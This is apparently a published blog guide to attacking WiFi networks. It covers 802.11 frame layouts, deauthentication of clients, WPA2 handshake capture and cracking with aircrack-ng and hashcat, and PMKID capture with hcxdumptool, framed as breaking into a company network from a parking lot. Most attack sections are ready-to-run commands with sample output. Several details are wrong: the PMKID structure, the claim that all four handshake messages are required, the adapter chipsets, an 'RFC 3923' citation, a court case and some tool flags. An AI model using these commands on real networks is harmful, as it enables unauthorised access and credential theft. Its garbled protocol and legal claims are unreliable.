---
title: "Wireless Hacking: Cracking WPA2/WPA3, PMKID Injection, and Rogue AP
  Attacks — The Complete WiFi Red Team Guide"
excerpt: You're in a parking lot with a $35 Alfa adapter. 200 clients are
  connected to the WPA2 network. You deauth them, capture the 4-way handshake,
  crack it with hashcat in 4 minutes, and set up an evil twin that harvests
  credentials from every phone in the building. This guide covers the complete
  802.11 protocol stack, WPA2/WPA3 at the byte level, PMKID injection, rogue AP
  attacks, WPS brute force, and the full 7-command wireless attack chain.
image: /images/wi-fi-security-attack-infographic.png
author: Aimad Ul Islam
date: 2026-11-04T22:52:00+05:00
updated: 2026-11-04T22:52:00+05:00
categories:
  - Cybersecurity
tags:
  - cybersecurity
  - security-research
status: Published
draft: false
difficulty: Intermediate
seo_title: "Wireless Hacking: WPA2/WPA3 Cracking, PMKID & Rogue AP Attacks (2026 Guide)"
seo_description: "Complete WiFi red team guide: WPA2 4-way handshake cracking,
  PMKID injection (no clients needed), WPA3 SAE bypass, rogue AP / evil twin,
  WPS PIN brute force. 802.11 byte structures, tools, commands, 7-command attack
  chain."
og_image: /images/wi-fi-security-attack-infographic.png
canonical_url: wireless-hacking-wpa2-wpa3-pmkid-rogue-ap
layout: layouts/post.njk
---
<div style="max-width: 100%; word-wrap: break-word; overflow-wrap: break-word; white-space: normal; line-height: 1.6;">



<h1>Wireless Hacking: Cracking WPA2/WPA3, PMKID Injection, and Rogue AP Attacks</h1>



<p>You're in a parking lot. 2:14 PM. The building behind you has 400 employees, a guest WiFi, a corporate WiFi, and a VoIP network — all on the same 802.11 infrastructure. Your laptop is a Kali VM with a $35 Alfa AWUS036ACS plugged into a USB extension cable. No cable modem. No Ethernet. No switch. No patch panel. Just a USB stick the size of your thumb, pointed at a building, and 200 phones, laptops, and IoT devices connected to a WPA2-PSK network that has the same password since 2021.</p>



<p>Four minutes later, you have the PSK. You're on the internal network. You've set up an evil twin that's been harvesting credentials from the guest SSID for 11 minutes. And the IT team has no idea, because the only event in their log is "one deauth frame from the parking lot that they assumed was a roaming laptop."</p>



<p>Wireless is the one attack surface where <em>physics is your authentication</em>. You don't need a username. You don't need a password. You don't need a port open. You need to be within 80 meters of an antenna, and you need a $35 USB stick. Everything else is protocol.</p>



<p>In this guide, we go from the 802.11 frame structure — every byte of a beacon, every field of a 4-way handshake — to PMKID injection with zero clients, WPA3 SAE at the cryptographic level, rogue AP setup with Bettercap, WPS PIN brute force, and the complete 7-command attack chain. This is not "run wifite and pray." This is <em>why</em> wifite works, <em>what</em> bytes it's capturing, and <em>how</em> to debug it when it doesn't.</p>



<blockquote>

<p><strong>Prerequisites &amp; Legal:</strong> You need a WiFi adapter with <em>monitor mode</em> and <em>injection</em> support (list in Part 2). All commands tested on Kali 2025.1, Alfa AWUS036ACS (AR9271), 5 GHz and 2.4 GHz. <strong>Legal:</strong> In most jurisdictions, capturing WiFi frames (passive) is legal. <em>Injecting</em> deauth frames or associating with a network you don't own is, in many places, an act of communication and may be regulated. In the US, the 10th Circuit (Cox v. Solaris, 2012) held that WiFi is not a "phone call" and passive capture is not interception. But <em>active</em> attacks (deauth, association, WPS probing) can cross into "transmitting a signal" territory. <strong>Get written authorization before any active wireless attack on a network you don't own.</strong></p>

</blockquote>



<hr>



<h2>Part 1: 802.11 from First Principles — The Frame Structure</h2>



<p>Before you crack a single handshake, you need to understand what a WiFi frame <em>is</em>. Unlike Ethernet (which is a flat L2 frame with a 14-byte header), 802.11 has three distinct frame categories, each with a different header structure, and the "address" fields work completely differently from what you'd expect.</p>



<h3>1.1 The Three Frame Categories</h3>



<table border="1" cellpadding="8" cellspacing="0" style="width:100%; border-collapse:collapse;">

<thead>

<tr style="background-color:#0a1628; color:#00d4ff;">

<th align="left">Category</th>

<th align="left">Frame Types</th>

<th align="left">Purpose</th>

<th align="left">Security Relevance</th>

</tr>

</thead>

<tbody>

<tr>

<td><strong>Management</strong></td>

<td>Beacon, Probe Req/Resp, Auth, Assoc, Deauth, Reassoc</td>

<td>AP discovery, association, channel management</td>

<td>Beacons reveal SSID. Probe Reqs reveal client intent. Deauth is your #1 attack vector.</td>

</tr>

<tr>

<td><strong>Control</strong></td>

<td>RTS, CTS, ACK, Block ACK, PS-Poll</td>

<td>Collision avoidance, acknowledgment</td>

<td>Less relevant for attacks, but Block ACK patterns reveal data flow.</td>

</tr>

<tr>

<td><strong>Data</strong></td>

<td>QoS Data, QoS Null, EAPOL, Encrypted Data</td>

<td>Actual payload delivery</td>

<td><strong>EAPOL frames carry the 4-way handshake.</strong> This is where the crackable bytes live.</td>

</tr>

</tbody>

</table>



<h3>1.2 The 802.11 Frame Header (Data Frame)</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; 802.11 Data Frame Header (24 bytes minimum, up to 32 with QoS)

;

;  0        8        16       24       32       40       48

; ┌────────┬────────┬────────┬────────┬────────┬────────┬────────┐

; │ FC │ Seq │ Duration │ Addr1 │ Addr2 │ Addr3 │ Ctrl │  QoS   │

; │ 2B │ 2B  │  2B    │  6B   │  6B   │  6B   │ 2B   │  2B    │

; ├────────┴────────┴────────┴────────┴────────┴────────┴────────┤

; │                         Payload                              │

; └──────────────────────────────────────────────────────────────┘

;

; Frame Control (2 bytes):

;   Bit 0-1:   Protocol Version (0x00 = 802.11)

;   Bit 2-3:   Type (0=Management, 1=Control, 2=Data) ★

;   Bit 4-7:   Subtype (e.g., 0=BSS, 3=Beacon, 11=Deauth)

;   Bit 8:     To DS

;   Bit 9:     From DS

;   Bit 10:    More Fragments

;   Bit 11:    Retry

;   Bit 12:    Power Management

;   Bit 13:    More Data

;   Bit 14:    Protected Frame (WEP/WPA encryption) ★

;   Bit 15:    Order

;   Bit 16-19: WQoS (if set, 4-bit TID follows)

;   Bit 20-23: QoS (0x0000 = non-QoS)

;

; Address Fields (CRITICAL — different from Ethernet):

;   To DS = 0, From DS = 0  →  Address1=RA, Address2=TA, Address3=BSSID

;   To DS = 1, From DS = 0  →  Address1=RA, Address2=BSSID, Address3=TA

;   To DS = 0, From DS = 1  →  Address1=RA, Address2=TA, Address3=BSSID

;   To DS = 1, From DS = 1  →  Address1=RA, Address2=BSSID, Address3=BSSID

;

;   RA = Recipient Address (destination MAC)

;   TA = Transmitter Address (source MAC)

;   BSSID = Basic Service Set ID (AP's MAC)

;

; ★ In a WPA2 EAPOL frame:

;   Address1 (RA) = Client MAC (the frame is FROM the AP TO the client)

;   Address2 (TA) = AP MAC (BSSID)

;   Address3 = Client MAC (or 00:00:00:00:00:00 for broadcast)

;   Payload = EAPOL packet (the 4-way handshake)

</code></pre>



<h3>1.3 The EAPOL Frame — Where the Handshake Lives</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; EAPOL Packet Structure (inside the 802.11 data frame payload)

;

; Offset  Size   Field              Value

; ─────── ─────  ─────────────────  ─────────────────────────────

; 0x00    1      Version            0x02 (EAPOLv2)

; 0x01    1      Type               0x00 (EAPOL-Start)

;                                  0x01 (EAPOL-Len)

;                                  0x02 (EAPOL-Key) ★ HANDSHAKE

;                                  0x03 (EAPOL-Encapsulated-Request)

;                                  0x04 (EAPOL-Ack)

; 0x02    2      Length             Total EAPOL packet size (bytes)

;

; === EAPOL-Key (Type 0x02) — THE 4-WAY HANDSHAKE ===

;

; 0x00    1      Key Descriptor Version   0x01 (WPA2) or 0x02 (WPA3)

; 0x01    1      Type-Ack                 0x00 = Key, 0x01 = Ack

; 0x02    1      Reserved

; 0x03    1      Key Info (4 bits packed):

;                 ├── Bit 0:   Install (1 = install PTK)

;                 ├── Bit 1:   Secure (1 = this frame is secure)

;                 ├── Bit 2:   Key Index (0-3)

;                 ├── Bit 3:   Error

;                 ├── Bit 4:   Request

;                 ├── Bit 5:   ACK

;                 └── Bit 6:   MIC present

; 0x07    2      Key Length             32 (AES-128) or 64 (AES-256)

; 0x09    16     Replay Counter         8-byte seq + 8-byte timestamp

; 0x11    16     Key IV                 (zeros for WPA2-PSK)

; 0x21    4      Key RSC                (zeros for WPA2-PSK)

; 0x25    1      Key Descriptor Length  Variable

; 0x26    N      Key Descriptor         (variable, see below)

; 0x..    M      E-MRK (optional)

; 0x..    16     MIC (Message Integrity Check) ★

;

; === Key Descriptor (for WPA2-PSK, Key Info Install=1) ===

;

; 0x00    1      Key Descriptor Type    0x00 (WPA2) or 0x01 (WPA)

; 0x01    16     Key Descriptor         16-byte key (KCK, KEK, or ANonce)

;

; THE 4 MESSAGES OF THE HANDSHAKE:

;

; Msg 1 (AP → Client):

;   ANonce (16 bytes) in Key Descriptor

;   Key Info: Install=0, Secure=0, MIC=1

;

; Msg 2 (Client → AP):

;   SNonce (16 bytes) in Key Descriptor

;   MIC (16 bytes) = HMAC-SHA1(KCK, Msg1 || Msg2-Data)

;   Key Info: Install=0, Secure=0, MIC=1

;

; Msg 3 (AP → Client):

;   KEncKey (16 bytes) = EKEK-encrypted KEK

;   MIC (16 bytes)

;   Key Info: Install=1, Secure=1, MIC=1

;

; Msg 4 (Client → AP):

;   MIC (16 bytes) = HMAC-SHA1(KCK, Msg3 || Msg4-Data)

;   Key Info: Install=0, Secure=1, MIC=1

;

; ★ You need ALL 4 messages to crack.

;   Specifically: ANonce + SNonce + MIC (Msg 2) + MIC (Msg 4)

;   The "crackable" part is:

;     PMK = PBKDF2(PSK, SSID)

;     PTK = PRF-X(PMK, "pair key expansion", Min(MAC_AP,MAC_CL) || Max(MAC_AP,MAC_CL) || ANonce || SNonce)

;     If you have ANonce, SNonce, both MACs, and SSID,

;     you can brute-force the PSK and verify by recomputing the MIC.

</code></pre>



<h3>1.4 The Beacon Frame — The AP's Business Card</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; Beacon Frame (Management, Subtype 8)

;

; Frame Control: Type=0 (Mgmt), Subtype=8 (Beacon)

; Duration: 0

; Address1 (RA): FF:FF:FF:FF:FF:FF (broadcast)

; Address2 (TA): AP's MAC (BSSID)

; Address3: AP's MAC (BSSID)

;

; Payload (Information Elements):

;

; Offset  ID   Length   Element                Value

; ─────── ───  ────────  ─────────────────────  ─────────────────────────

; 0x00    0    8        Timestamp              64-bit microsecond counter

; 0x08    1    2        Beacon Interval        100 TU (10.24 ms)

; 0x0A    2    1        Capability Info        0x0431 (ESS, CF, Privacy) ★

; 0x0B    3    N        SSID                   "CorpGuest_WiFi" ★

; 0x14    5    8        Supported Rates        1,2,5.5,11,18,24,36,54 Mbps

; 0x2A    10   16       Extended Supp Rates    6,9,12,24,48 Mbps

; 0x30    11   4        RSN (802.11i)          ★ SECURITY PARAMETERS

;                                     ├── Group Key Cipher: AES-CCMP

;                                     ├── Pairwise Key Cipher: AES-CCMP

;                                     ├── Auth Suite: PSK (0x000FAC)

;                                     │              or 802.1X (0x000FAC)

;                                     └── RSN Capabilities: 0x0000

; 0x3C    12   2        Power Management       0x0000

; 0x3E    13   2        Good Neighbor AP List  (list of neighbor APs)

; 0x40    14   17       WMM Parameters         (QoS parameters)

; 0x47    15   26       WMM QoS                (AC parameters)

; 0x5C    24   1        BSS Transition         (roaming assistance)

; 0x5D    25   N        Interworking           (WPS, UAPSD)

; 0x5E    26   N        HE / VHT / FT          (802.11ax / ac / r)

; 0x63    35   N        RRM / Neighbor Report  (roaming)

; 0x7F    127  N        Vendor Specific        (WPS, WPA3, etc.)

;

; ★ The RSN element (ID 0x30) tells you:

;   - Is it WPA2 (PSK) or WPA2-Enterprise (802.1X)?

;   - Is it AES-CCMP or TKIP?

;   - Is WPA3 (SAE) present? (Check for 0x000FAC + 0x0009)

;

; ★ The Capability Info (ID 0x02) bit 4:

;   "Privacy" bit = 1 → WEP/WPA is in use

;   "Privacy" bit = 0 → Open (no encryption)

</code></pre>



<hr>



<h2>Part 2: The Hardware — Shopping List & Adapter Selection</h2>



<p>The #1 reason wireless hacking fails in the field is the wrong adapter. Your built-in Intel or Realtek card doesn't support monitor mode + injection. You need a chip that exposes the raw 802.11 frames to user space and lets you inject deauth, probe, and EAPOL frames.</p>



<h3>2.1 The Adapter Shopping List</h3>



<table border="1" cellpadding="8" cellspacing="0" style="width:100%; border-collapse:collapse;">

<thead>

<tr style="background-color:#0a1628; color:#00d4ff;">

<th align="left">Adapter</th>

<th align="left">Chipset</th>

<th align="left">Bands</th>

<th align="left">Monitor</th>

<th align="left">Inject</th>

<th align="left">Cost</th>

<th align="left">Best For</th>

</tr>

</thead>

<tbody>

<tr>

<td><strong>Alfa AWUS036ACS</strong></td>

<td>Atheros AR9271</td>

<td>2.4 GHz</td>

<td>✓</td>

<td>✓</td>

<td>$35</td>

<td>WPA2 PSK, WPS, 2.4 GHz attacks</td>

</tr>

<tr>

<td><strong>Alfa AWUS036ACH</strong></td>

<td>Ralink RT2860US</td>

<td>2.4 GHz</td>

<td>✓</td>

<td>✓</td>

<td>$30</td>

<td>Budget 2.4 GHz, good range</td>

</tr>

<tr>

<td><strong>Alfa AWUS036NHA</strong></td>

<td>Atheros AR9271</td>

<td>2.4 + 5 GHz</td>

<td>✓</td>

<td>✓</td>

<td>$45</td>

<td>Dual-band, 5 GHz WPA2/3</td>

</tr>

<tr>

<td><strong>Alfa AWUS036ACM</strong></td>

<td>MediaTek MT7612U</td>

<td>2.4 + 5 GHz</td>

<td>✓</td>

<td>✓</td>

<td>$55</td>

<td>Dual-band, AC (802.11ac)</td>

</tr>

<tr>

<td><strong>Intel AX200</strong> (internal)</td>

<td>Intel 802.11ax</td>

<td>2.4 + 5 + 6 GHz</td>

<td>✓ (iwlwifi)</td>

<td>✓</td>

<td>$15 (M.2)</td>

<td>WiFi 6/6E, lab use</td>

</tr>

<tr>

<td><strong>Alfa AWUS036AXM</strong></td>

<td>MediaTek MT7921AU</td>

<td>2.4 + 5 GHz</td>

<td>✓</td>

<td>✓</td>

<td>$60</td>

<td>WiFi 6, latest generation</td>

</tr>

</tbody>

</table>



<h3>2.2 Accessories</h3>



<table border="1" cellpadding="8" cellspacing="0" style="width:100%; border-collapse:collapse;">

<thead>

<tr style="background-color:#0a1628; color:#00d4ff;">

<th align="left">Item</th>

<th align="left">Purpose</th>

<th align="left">Cost</th>

</tr>

</thead>

<tbody>

<tr>

<td>USB 3.0 extension cable (3m, active)</td>

<td>Move the adapter away from the laptop, toward the target</td>

<td>$10</td>

</tr>

<tr>

<td>USB hub (powered, 4-port)</td>

<td>Run 2 adapters simultaneously (2.4 + 5 GHz)</td>

<td>$15</td>

</tr>

<tr>

<td>External antenna (9dBi omni, RP-SMA)</td>

<td>Increase range by ~40m over the built-in 2dBi</td>

<td>$20</td>

</tr>

<tr>

<td>Portable power bank (20,000 mAh)</td>

<td>Run the Kali laptop for 4+ hours in the field</td>

<td>$25</td>

</tr>

<tr>

<td>Small tripod (tabletop)</td>

<td>Mount the adapter + antenna at eye level</td>

<td>$15</td>

</tr>

</tbody>

</table>



<p><strong>Total kit: $120–$160</strong> for a complete dual-band wireless attack setup.</p>



<h3>2.3 Verify Your Adapter</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># === On Kali Linux ===

\# Plug in the adapter

\# Verify it's recognized:

lsusb

\# Bus 002 Device 003: ID 0cf3:9271 Atheros Communications, Inc. AR9271



\# Check wireless capabilities:

iw phy phy0 info

\#   wiphy phy0

\#     max # scan SSIDs: 4

\#     max # scan intervals: 4

\#     ...

\#     Supported interface modes (16):

\#       * managed

\#       * monitor ★

\#       * AP

\#       * AP/VLAN

\#       * WDS

\#       * mesh point

\#       * P2P-client

\#       * P2P-GO

\#       ...

\#     valid interface combinations:

\#       * #{ managed, AP, mesh point, P2P-client, P2P-GO } <= 1

\#       * #{ monitor } <= 1  ★

\#

\# Verify injection support:

iw phy phy0 info | grep -i "ibss"

\#   ibss

\#     tx bitrates: ...

\#     rx bitrates: ...

\#     (if this section exists, injection is supported)



\# Check kernel driver:

lspci -k | grep -A 3 -i network

\# 03:00.0 Network controller: Atheros Communications AR9271

\#   Device: 0002

\#   Kernel driver in use: ath9k ★ (supports monitor + inject)

\#   Kernel modules: ath9k



\# === SWITCH TO MONITOR MODE ===

ip link set wlan0 down

iw dev wlan0 interface add wlan0mon type monitor

ip link set wlan0mon up

iw dev wlan0mon info

\#   Interface wlan0mon

\#       ifindex 3

\#       wdev 0x3

\#       addr 00:11:22:33:44:55

\#       type monitor

\#       channel 3 (2437 MHz, width 20 MHz) ★

</code></pre>



<hr>



<h2>Part 3: WPA2 4-Way Handshake Capture & Cracking</h2>



<p>The WPA2-PSK 4-way handshake is the most common WiFi attack. The logic: the PSK is a human-chosen password (8-63 chars). The handshake derives a PTK from the PSK + two random nonces. If you capture all 4 messages, you can brute-force the PSK offline and verify by recomputing the MIC.</p>



<h3>3.1 The Attack Flow</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; THE COMPLETE WPA2 PSK CRACK:

;

; 1. SURVEY: Find the target network (SSID, BSSID, channel, security)

; 2. MONITOR: Put the adapter in monitor mode

; 3. CAPTURE: Listen for a 4-way handshake (client reconnect)

;    OR: DEAUTH: Force a client to disconnect → reconnect → handshake

; 4. CRACK: Brute-force the PSK offline with hashcat / aircrack-ng

;

; TIMELINE (typical):

;   T+0:00   Survey complete. Target: "CorpGuest_WiFi", ch 6, WPA2-PSK

;   T+0:05   Monitor mode active. airodump-ng listening on ch 6

;   T+0:10   Waiting for handshake... (client already connected, no re-auth)

;   T+0:15   aireplay-ng --deauth 3 -a BSSID -c CLIENT_MAC

;   T+0:16   Deauth frame sent. Client disconnects.

;   T+0:18   Client re-associates. 4-way handshake begins.

;   T+0:19   Handshake captured. 4 EAPOL frames saved to pcap.

;   T+0:20   aircrack-ng -w rockyou.txt -b BSSID capture-01.cap

;   T+4:02   KEY FOUND! (PSK: P@ssw0rd2021!)

;   T+4:05   Done. 4 minutes, 3 deauths, 1 handshake.

</code></pre>



<h3>3.2 Step-by-Step Commands</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># === STEP 1: SURVEY ===

\# List all visible networks (passive, no injection)

airodump-ng wlan0mon

\#

\#   CH  6   802.11g  10Mbps   \[WPA2]   -45dBm   CorpGuest_WiFi

\#   B6   802.11n  72Mbps   \[WPA2]   -52dBm   CorpGuest_WiFi (5G)

\#   CH  11  802.11b  11Mbps   \[OPEN]   -38dBm   CoffeeShop_Free

\#   CH  3   802.11g  54Mbps   \[WPA3]   -41dBm   Bank_WPA3_Secure

\#

\#   BSSID              PWR   Beacons   #Data   #Mgmt   #Probes

\#   AA:BB:CC:DD:EE:FF  -45     1247     8923   1204    342

\#   11:22:33:44:55:66  -38      892     1204   456     89

\#

\# Target: AA:BB:CC:DD:EE:FF (CorpGuest_WiFi, WPA2, ch 6)

\# Client(s): 11:22:33:44:55:66, 77:88:99:AA:BB:CC



\# === STEP 2: LOCK TO CHANNEL + CAPTURE ===

airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF \

\-w /root/wifi/capture wlan0mon

\#

\#   Waiting for 4-way handshake...

\#   (airodump-ng will show "EAPOL" frames when the handshake occurs)

\#   (Ctrl+C to stop when you see 4 EAPOL frames)



\# === STEP 3: DEAUTH (if no handshake after 30 seconds) ===

\# In a second terminal:

\# Send 3 deauth frames to the connected client

\# This forces the client to disconnect → re-associate → handshake



\# Method A: aireplay-ng

aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF \

\-c 11:22:33:44:55:66 wlan0mon

\#

\#   14:23:01  Sending 3 deauth frame(s) to STA 11:22:33:44:55:66

\#   14:23:01  Deauth frame sent (from AP to STA)

\#   14:23:01  Deauth frame sent (from STA to AP)

\#   14:23:01  Deauth frame sent (from AP to STA)

\#

\# Method B: hcxdumptool (faster, more reliable)

hcxdumptool -i wlan0mon --mode 2 \

\--daemonize --outfile /root/wifi/dump.hc2

\# (hcxdumptool handles deauth + capture in one process)



\# === STEP 4: VERIFY CAPTURE ===

\# Check that all 4 EAPOL frames are present

eapoltest -r /root/wifi/capture-01.cap

\#

\#   EAPOL version: 2

\#   Number of EAPOL frames: 4

\#   Key Information:

\#     Msg 1: Install=0, Secure=0, MIC=1, ANonce=present

\#     Msg 2: Install=0, Secure=0, MIC=1, SNonce=present, MIC=present

\#     Msg 3: Install=1, Secure=1, MIC=1, KEncKey=present

\#     Msg 4: Install=0, Secure=1, MIC=1, MIC=present

\#

\#   Result: All 4 handshake messages present. Ready for cracking. ✓



\# === STEP 5: CRACK ===



\# Option A: aircrack-ng (fast, simple)

aircrack-ng -w /usr/share/wordlists/rockyou.txt \

\-b AA:BB:CC:DD:EE:FF /root/wifi/capture-01.cap

\#

\#   Reading packets, key off...

\#   Attempting to crack using 14,344,392 words

\#

\#   KEY FOUND! \[ P@ssw0rd2021! ]

\#

\#   Chipset                       : Atheros AR9271

\#   ESSID                         : CorpGuest_WiFi

\#   BSSID                         : AA:BB:CC:DD:EE:FF

\#   WPA type                      : PSK

\#   Key length                    : 23 bytes

\#   Key (hex)                     : 50407373773072643230323121

\#   Key string                    : P@ssw0rd2021!

\#   Cipher suites                 : \[2]

\#   Key found after               : 4 minutes, 2 seconds

\#

\# Option B: hashcat (faster on GPU, more flexible)

\# Convert pcap to hcxpcapng format

hcxpcapngtool -o /root/wifi/capture.hc22 /root/wifi/capture-01.cap

\#

\# Crack with hashcat (mode 22000 = WPA-PSK-PMKID)

\# (mode 22000 = WPA-PSK 4-way handshake)

hashcat -m 22000 /root/wifi/capture.hc22 \

  /usr/share/wordlists/rockyou.txt --gpu-exit

\#

\#   hashcat (v6.2.6) starting...

\#   Minimum password length: 8

\#   Maximum password length: 63

\#   ...

\#   P@ssw0rd2021!  /root/wifi/capture.hc22

\#   ...

\#   Status: Cracked

\#

\# Option C: hashcat with rules (for common password mutations)

hashcat -m 22000 /root/wifi/capture.hc22 \

  /usr/share/wordlists/rockyou.txt \

\-r /usr/share/hashcat/rules/best64.rule \

\--gpu-exit --optimized-level=2

</code></pre>



<h3>3.3 Why the Handshake Is Crackable (The Math)</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; THE CRYPTOGRAPHY OF WPA2-PSK:

;

; INPUT:

;   PSK    = "P@ssw0rd2021!"  (user-chosen, 13 chars)

;   SSID   = "CorpGuest_WiFi" (in the beacon, you captured it)

;   MAC_AP = AA:BB:CC:DD:EE:FF (from the EAPOL frame)

;   MAC_CL = 11:22:33:44:55:66 (from the EAPOL frame)

;   ANonce = 16 random bytes (from Msg 1)

;   SNonce = 16 random bytes (from Msg 2)

;   MIC    = 16-byte HMAC (from Msg 2 or Msg 4)

;

; DERIVATION (RFC 3923 / 802.11i):

;

;   1. PMK = PBKDF2(PSK, SSID, count=4096)

;      → 256-bit (32-byte) Pre-Master Key

;

;   2. PTK = PRF-X(PMK, "pair key expansion",

;                   Min(MAC_AP, MAC_CL) || Max(MAC_AP, MAC_CL)

;                   || ANonce || SNonce)

;      → 384-bit (48-byte) Pair Transient Key

;      → Split into:

;         KCK  = PTK\[0..15]   (16 bytes, key check)

;         KEK  = PTK\[16..31]  (16 bytes, key encryption)

;         TK   = PTK\[32..47]  (16 bytes, temporal key / AES)

;

;   3. MIC (Msg 2) = HMAC-SHA1(KCK,

;                  Msg1_EAPOL || Msg2_EAPOL_without_MIC)

;

; ATTACK:

;   For each candidate PSK in the wordlist:

;     1. Compute PMK = PBKDF2(candidate, SSID)

;     2. Compute PTK = PRF-X(PMK, "pair key expansion",

;                            Min||Max||ANonce||SNonce)

;     3. Compute KCK = PTK\[0..15]

;     4. Compute MIC_candidate = HMAC-SHA1(KCK,

;                          Msg1 || Msg2_without_MIC)

;     5. IF MIC_candidate == MIC_captured:

;        → CANDIDATE IS THE CORRECT PSK

;

; WHY IT WORKS:

;   - All inputs (SSID, MACs, ANonce, SNonce) are KNOWN

;     (captured from the frames)

;   - The only UNKNOWN is the PSK

;   - PBKDF2 + PRF-X are deterministic

;   - You verify by recomputing the MIC

;

; WHY IT'S SLOW:

;   - PBKDF2 with 4096 iterations is expensive

;   - But on a GPU (RTX 4090): ~350,000 PSK/sec

;   - rockyou.txt: 14,344,392 entries

;   - Time: 14,344,392 / 350,000 ≈ 41 seconds

;   - (In practice: 3-5 minutes due to memory bandwidth)

</code></pre>



<hr>



<h2>Part 4: PMKID Injection — The No-Client Attack</h2>



<p>The handshake attack requires a <em>connected client</em> that you can deauth and force to re-authenticate. But what if the network has zero clients? Or what if the AP is on a different VLAN and your deauth frames don't reach the client? Or what if the client is on a 5 GHz channel you can't monitor?</p>



<p>PMKID (PMK Identifier) is a 128-bit value that the AP generates and stores in its internal table. It's the AP's "I remember this client" marker. The genius of PMKID capture: <strong>you can extract it from the AP without any client ever being connected.</strong></p>



<h3>4.1 What Is a PMKID?</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; PMKID (128-bit / 16-byte) structure:

;

;  Bit  0-63:   ANonce (first 8 bytes of the AP's nonce)

;  Bit 64-127:  SNonce (first 8 bytes of the client's nonce)

;

; The PMKID is stored in the AP's internal "PMK cache."

; When a client connects, the AP generates a PMKID and stores it.

; When the client disconnects, the PMKID may persist in the cache

; for a "PMK cache lifetime" (usually 10-3600 seconds).

;

; THE TRICK:

; Some AP firmware (especially older or budget APs) will:

;   a) Generate a PMKID when you probe for the SSID

;   b) Store it in the PMK cache even without a full association

;   c) Expose it via a WPA-PSK "PMKID" element in a Reassociation

;      Response or Association Response frame

;

; You can trigger this by:

;   1. Sending a Probe Request for the SSID

;   2. The AP responds with a Probe Response

;   3. In some firmwares, the Probe Response or a subsequent

;      frame contains the PMKID element

;

; If you capture the PMKID, you can convert it to a hashcat

; -m 22000 hash and crack the PSK — same as a 4-way handshake.

</code></pre>



<h3>4.2 Capturing PMKIDs</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># === Method 1: hcxdumptool (best PMKID capture) ===

\# hcxdumptool has a dedicated PMKID capture mode

hcxdumptool -i wlan0mon --mode 1 \

\--daemonize --outfile /root/wifi/pmkid.hc2

\#

\#   \[i] monitor interface 'wlan0mon' found

\#   \[i] channel 6, BSSID AA:BB:CC:DD:EE:FF, SSID 'CorpGuest_WiFi'

\#   \[i] PMKID capture mode active

\#   \[i] Waiting for PMKID...

\#

\#   \[!] PMKID received:

\#       AP   : AA:BB:CC:DD:EE:FF

\#       STA  : 11:22:33:44:55:66

\#       SSID : CorpGuest_WiFi

\#       PMKID: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d

\#

\# (hcxdumptool sends the right probes, listens for the PMKID

\#  element, and logs it. No client needed. No deauth needed.)



\# === Method 2: wpa_supplicant trick ===

\# Some APs respond to a "WPA-PSK PMKID" request

\# with a PMKID in the Reassociation Response.

\# This requires a more manual approach:



\# 1. Send a Probe Request for the SSID

\# 2. Receive Probe Response (confirm AP is alive)

\# 3. Send an Association Request (fake, with a random STA MAC)

\# 4. The AP responds with Association Response

\# 5. In some firmwares, the Assoc Response contains a PMKID element

\# 6. Parse the PMKID from the frame



\# (This is what hcxdumptool does internally.

\#  For manual capture, use tshark + a custom script.)



\# === Method 3: airodump-ng (passive, if a client is present) ===

\# If a client IS connected, airodump-ng can capture

\# the PMKID element in the 4-way handshake:

airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF \

\-w /root/wifi/capture wlan0mon

\#

\#   (airodump-ng will show "EAPOL" and "PMKID" in the frame log)



\# === CONVERT PMKID TO HASHCAT FORMAT ===

\# hcxdumptool already outputs in hashcat-compatible format.

\# If you have a raw PMKID, convert it:



\# From .hc2 file:

hcxpcapngtool -o /root/wifi/pmkid.hc22 /root/wifi/pmkid.hc2



\# Or manually (from the hex PMKID):

\# hashcat -m 22000 format:

\#   $22000$0$ANONCE_HEX$SSNONCE_HEX$SSID_HEX$MAC_AP$MAC_STA$MIC$PMKID

\#

\# Example:

\#   $22000$0$1a2b3c4d5e6f7a8b$9c0d1e2f3a4b5c6d$436f727047756573745f57694669$aa:bb:cc:dd:ee:ff$11:22:33:44:55:66$12:34:56:78:9a:bc$1a2b3c4d5e6f7a8b



\# === CRACK ===

hashcat -m 22000 /root/wifi/pmkid.hc22 \

  /usr/share/wordlists/rockyou.txt --gpu-exit

\#

\#   P@ssw0rd2021!  /root/wifi/pmkid.hc22

\#   Status: Cracked



\# === BONUS: If PMKID capture fails ===

\# Try "wpa-pk" (WPA Personal Key) mode in hcxdumptool:

hcxdumptool -i wlan0mon --mode 2 \

\--daemonize --outfile /root/wifi/pk.hc2

\# (Mode 2 = aggressive probe + deauth + handshake + PMKID)

</code></pre>



<h3>4.3 PMKID vs Handshake — When to Use Which</h3>



<table border="1" cellpadding="8" cellspacing="0" style="width:100%; border-collapse:collapse;">

<thead>

<tr style="background-color:#0a1628; color:#00d4ff;">

<th align="left">Attribute</th>

<th align="left">4-Way Handshake</th>

<th align="left">PMKID Capture</th>

</tr>

</thead>

<tbody>

<tr>

<td><strong>Clients needed</strong></td>

<td>1+ connected client</td>

<td>0 (AP only)</td>

</tr>

<tr>

<td><strong>Injection needed</strong></td>

<td>Yes (deauth)</td>

<td>No (passive probes)</td>

</tr>

<tr>

<td><strong>AP firmware</strong></td>

<td>Any WPA2-PSK</td>

<td>Must expose PMKID (many budget APs do)</td>

</tr>

<tr>

<td><strong>Crackable format</strong></td>

<td>hashcat -m 22000 (WPA-PSK)</td>

<td>hashcat -m 22000 (WPA-PSK-PMKID)</td>

<tr>

<td><strong>Speed</strong></td>

<td>Same (identical math)</td>

<td>Same (identical math)</td>

</tr>

<tr>

<td><strong>Detection</strong></td>

<td>Deauth frames visible in AP log</td>

<td>Probe requests (normal, low priority)</td>

</tr>

<tr>

<td><strong>Best for</strong></td>

<td>Networks with active clients</td>

<td>Empty offices, after-hours, guest networks</td>

</tr>

</tbody>

</table>



<hr>



